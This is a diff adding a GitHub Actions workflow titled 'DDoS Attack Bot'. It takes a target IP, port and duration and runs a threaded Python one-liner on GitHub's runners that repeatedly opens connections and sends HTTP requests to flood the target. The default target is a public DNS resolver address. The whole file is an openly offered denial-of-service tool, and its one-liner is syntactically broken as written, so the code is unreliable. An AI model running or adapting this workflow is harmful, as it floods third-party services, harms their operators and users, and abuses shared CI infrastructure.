@@ -1,0 +1,24 @@
+name: DDoS Attack Bot
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target IP'
+        required: true
+        default: '1.1.1.1'
+      port:
+        description: 'Target Port'
+        required: true
+        default: '80'
+      duration:
+        description: 'Duration (seconds)'
+        required: true
+        default: '30'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run Attack
+        run: |
+          python3 -c "import socket,threading,time;t='${{ github.event.inputs.target }}';p=${{ github.event.inputs.port }};d=${{ github.event.inputs.duration }};print('Target:',t,p,'Duration:',d);c=0;def a():global c;e=time.time()+d;while time.time()<e:try:s=socket.socket();s.settimeout(1);s.connect((t,p));s.send(b'GET / HTTP/1.1\\r\\n\\r\\n');s.close();c+=1;except:pass;ts=[threading.Thread(target=a)for _ in range(30)];for th in ts:th.start();for th in ts:th.join();print('Requests:',c)"
